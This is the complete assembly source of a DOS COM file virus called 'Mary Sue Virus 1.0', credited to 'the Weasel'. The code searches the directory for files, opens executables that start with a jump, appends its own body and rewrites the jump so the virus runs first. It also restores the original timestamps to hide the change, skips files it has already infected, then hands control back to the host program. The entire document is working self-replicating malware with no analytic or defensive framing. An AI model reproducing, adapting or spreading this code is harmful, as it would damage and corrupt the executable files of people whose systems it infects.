
MarySue   SEGMENT BYTE PUBLIC 'code'
        ASSUME  CS:MarySue, DS:MarySue, SS:MarySue, ES:MarySue

        ORG     100h

DOS     EQU     21h

start:  JMP     pgstart
exlbl:  db      0CDh, 20h, 3, 2, 7
pgstart:CALL    MarySueVir
MarySueVir:
        POP     SI
        SUB     SI,offset MarySueVir
        MOV     BP,[SI+blnkdat]
        ADD     BP, OFFSET exlbl
        JMP     SHORT realprog

nfect:
        MOV     [SI+offset endprog+3],AX
        MOV     AH,40H
        LEA     DX,[SI+0105H]
        MOV     CX,offset endprog-105h
        INT     DOS
        PUSHF
        POPF
        JC      outa1
        RET
outa1:
        JMP     exit


realprog:
        CLD
        MOV     AH, 1Ah
        LEA     DX, [SI+ENDPROG+131h]
        INT     21h

        LEA     DX,[SI+fspec]
        XOR     CX, CX
        MOV     AH,4EH
mainloop:
        INT     DOS
        JC      hiccup

        LEA     DX, [SI+ENDPROG+131h+30]

        MOV     AX,3D02H
        INT     DOS
        MOV     BX,AX
        MOV     AH,3FH
        LEA     DX,[SI+endprog]
        MOV     DI,DX
        MOV     CX,0003H
        INT     DOS
        CMP     BYTE PTR [DI],0E9H
        JE      infect
nextfile:
        MOV     AH,4FH
        JMP     mainloop
hiccup: JMP     exit
infect:
        MOV     AX,5700h
        INT     DOS
        PUSH    DX
        PUSH    CX
        MOV     DX,[DI+01H]
        MOV     [SI+blnkdat],DX
; Tighter Code here - Dark Angel
        XOR     CX,CX
        MOV     AX,4200H
        INT     DOS
        MOV     DX,DI
        MOV     CX,0002H
        MOV     AH,3FH
        INT     DOS
        CMP     WORD PTR [DI],0807H
        JE      nextfile
getaval:

        XOR     DX,DX
        XOR     CX,CX
        MOV     AX,4202H
        INT     DOS
        OR      DX,DX
        JNE     nextfile
        CMP     AH,0FEH
        JNC     nextfile
        CALL    nfect
        MOV     AX,4200H
        XOR     CX, CX
        MOV     DX,OFFSET 00001
        INT     DOS
        MOV     AH,40H
        LEA     DX,[SI+offset endprog+3]
        MOV     CX,0002H
        INT     DOS
        MOV     AX,5701h
        POP     CX
        POP     DX
        INT     DOS
exit:
        MOV     AH,3EH
        INT     DOS



        MOV     AH, 1Ah
        MOV     DX, 80h
        INT     21h

        JMP     BP

fspec   LABEL   WORD
        DB      '*.*',0
nondata DB      ' *** Mary Sue Virus 1.0 ***'
        DB      '   Written by the Weasel!'
        DB      '  (C) Sector Infector Inc'
endenc  LABEL   BYTE

blnkdat LABEL   WORD
        DW      0000H

en_val  DW      0h

endprog LABEL   WORD
MarySue   ENDS
        END     start

